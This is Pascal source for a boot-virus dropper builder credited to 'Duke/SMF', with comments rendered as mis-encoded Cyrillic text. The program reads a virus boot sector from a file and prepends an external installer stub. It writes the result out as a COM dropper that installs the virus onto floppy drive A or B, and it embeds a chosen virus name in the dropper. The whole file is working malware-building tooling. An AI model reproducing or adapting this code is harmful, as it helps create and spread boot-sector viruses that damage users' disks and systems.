   (*
   *à¨ ¬ «¥©è¨å ¨§¬¥¥¨ïå ¢ â¥ªáâ¥ Inst.ASM ¥®¡å®¤¨¬® ¨á¯à ¢¨âì ç¨á«®¢ë¥
   ª®áâ âë ¢ ¤ ®¬ ä ©«¥ !!!
   * §¬¥à ¢á¥å á®§¤ ¢ ¥¬ëå ¤à®¯¯¥à®¢ à ¢¥ 628 ¡ ©â.
   *)

   program DropperBootMaker__by_Duke_SMF;
   const Inst   : array [1..116] of byte = {$I inst.inc};
   var Boot     : file;                    {ä ©« á boot-á¥ªâ®à®¬}
       DropName : string;                  {¨¬ï dropper' }
       Dropper  : file;                    {á®§¤ ¢ ¥¬ë© ä ©«}
       Sector   : array [1..512] of byte;  {á®¤¥à¦¨¬®¥ ä ©«  Boot}
       VirName  : string;                  {¨¬ï ¢¨àãá }
       Len      : byte;                    {¤«¨  ¨¬¥¨ ¢¨àãá }
       a,i      : byte;
   begin
   writeln('Dropper.Boot Maker v0.1 (c) by Duke/SMF  *** DVL Utilities ***');
   if paramcount<>1 then
     begin
   writeln('ˆ§£®â®¢¨â¥«ì ¨áâ ««ïâ®à®¢ ¤«ï boot-¢¨àãá®¢. *à®£à ¬¬  á®§¤ ¥â');
   writeln('COM-ä ©«, ¯à®¢®¤ïé¨© ãáâ ®¢ªã boot-á¥ªâ®à    ãª § ë© ¤¨áª®¢®¤.');
     writeln('ˆá¯®«ì§®¢ ¨¥ : DBM.EXE <boot.vir>');
     halt;
     end;
   filemode:=0;
   assign(Boot,paramstr(1));               {ç¨â ¥¬ boot-á¥ªâ®à}
   {$I-}reset(Boot,512);{$I+}
   if ioresult<>0 then
     begin
     writeln('” ©« ',paramstr(1),' ¥  ©¤¥ !');
     halt;
     end;
   blockread(Boot,Sector,1);
   close(Boot);
   filemode:=2;
   write('‚¢¥¤¨â¥ ¨¬ï á®§¤ ¢ ¥¬®£® dropper''  :');
   readln(DropName);
   assign(Dropper,DropName);
   rewrite(Dropper,1);                    {á®§¤ ¥¬ dropper}
   blockwrite(Dropper,Inst,116);          {¯¨è¥¬ ¨áâ ««ïâ®à}
   blockwrite(Dropper,Sector,512);        {¯¨è¥¬ boot-á¥ªâ®à}
   {----- § ¯¨áì ¨¬¥¨ ¢¨àãá  -----}
   repeat
     write('‚¢¥¤¨â¥ ¨¬ï ¢¨àãá  (¥ ¡®«¥¥ 20 á¨¬¢®«®¢):');
     readln(VirName);
     Len:=length(VirName);
   until Len<20;
   seek(Dropper,$44);
   for i:=1 to Len do
      begin
      a:=ord(VirName[i]);
      blockwrite(Dropper,a,1);
      end;
   {----- § ¯¨áì ¨¬¥¨ ¤¨áª®¢®¤  -----}
   repeat
     write('*  ª ª®© ¤¨áª ãáâ  ¢«¨¢ âì (0=A, 1=B):');
     readln(a);
   until a in [0,1];
   seek(Dropper,$22);
   blockwrite(Dropper,a,1);
   {-----}
   close(Dropper);
   writeln('Dropper á®§¤ !');
   end.
